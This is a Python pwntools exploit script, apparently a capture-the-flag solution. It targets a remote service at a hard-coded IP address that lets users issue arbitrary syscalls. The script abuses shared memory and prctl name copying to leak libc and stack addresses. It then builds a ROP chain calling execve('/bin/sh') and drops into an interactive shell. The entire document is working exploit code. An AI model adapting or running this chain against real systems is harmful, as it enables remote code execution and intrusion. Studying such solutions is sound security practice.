#!/usr/bin/python3
from pwn import *
from heaputils import get_PIE

SYS_shmget = 29
SYS_shmat = 30
SYS_mprotect = 10
SYS_sigreturn = 15
SYS_ioctl = 16
SYS_writev = 20
SYS_readv = 19
SYS_prctl = 157
SYS_arch_prctl = 158
PR_SET_NAME = 15
PR_GET_NAME = 16
ARCH_SET_FS = 0x1002
def syscall(p, no, a1, a2, a3):
	p.sendlineafter("syscall: ", str(no))
	p.sendlineafter("arg1: ", str(a1))
	p.sendlineafter("arg2: ", str(a2))
	p.sendlineafter("arg3: ", str(a3))
	p.recvuntil("retval: ")
	return int(p.recvline(), 16)

def syscall_(p, no, a1, a2, a3):
	p.sendlineafter("syscall: ", str(no))
	p.sendlineafter("arg1: ", str(a1))
	p.sendlineafter("arg2: ", str(a2))
	p.sendlineafter("arg3: ", str(a3))
	p.recvuntil("=========================\n")

def strcpy(p, src, dst):
	assert(syscall(p, SYS_prctl, PR_SET_NAME, src, 0) == 0)
	assert(syscall(p, SYS_prctl, PR_GET_NAME, dst, 0) == 0)

def spawn_session():
	LOCAL = False
	if LOCAL:
		p = process("./chall")
	else:
		p = remote("13.231.207.73", 9006)
	return p

def writeb(offset, ch):
	p = spawn_session()
	addr = syscall(p, SYS_shmat, mid, 0x0, 0)
	LIBC = addr + 0x7f717174b000 - 0x7f7172303000
	chptr = LIBC + [x for x in libc.search(p8(ch))][0]
	strcpy(p, chptr, addr + offset)
	p.close()

if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	
	p1 = spawn_session()
	mid = syscall(p1, 29, 0x1337, 0x1000, 0o1666)
	log.info("mid = %d\n"%mid)
	addr = syscall(p1, SYS_shmat, mid, 0x0, 0)
	log.info("Got address at: 0x%x"%addr)
	LIBC = addr + 0x7f717174b000 - 0x7f7172303000
	free_hook = LIBC + libc.symbols["__free_hook"]
	environ = LIBC + libc.symbols["environ"]

	pay = p64(environ) + p64(0x8)
	for i,x in enumerate(pay):
		writeb(i, x)
	syscall_(p1, SYS_writev, 1, addr, 1)
	STACK = u64(p1.recv(8))
	log.info("STACK: 0x%x"%STACK)

	# PIE = get_PIE(p1)
	# gdb.attach(p1, gdbscript="b *0x%x"%(PIE+0x16AD))
	execve = LIBC + libc.symbols["execve"]
	binsh_str = LIBC + [x for x in libc.search(b"/bin/sh\x00")][0]
	pop_rdi = LIBC + [x for x in libc.search(b"\x5f\xc3")][0]
	pop_rsi = LIBC + [x for x in libc.search(b"\x5e\xc3")][0]
	pop_rdx = LIBC + [x for x in libc.search(b"\x5a\xc3")][0]
	rop = p64(pop_rdi) + p64(binsh_str) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(execve)

	retstack = STACK + 0x7ffd4f871798 - 0x7ffd4f871898
	pay = p64(retstack) + p64(len(rop))
	for i,x in enumerate(pay):
		writeb(i, x)
	syscall_(p1, SYS_readv, 0, addr, 1)

	p1.send(rop)

	for i in range(6):
		syscall(p1,SYS_ioctl,1,1,1)
	
	p1.interactive()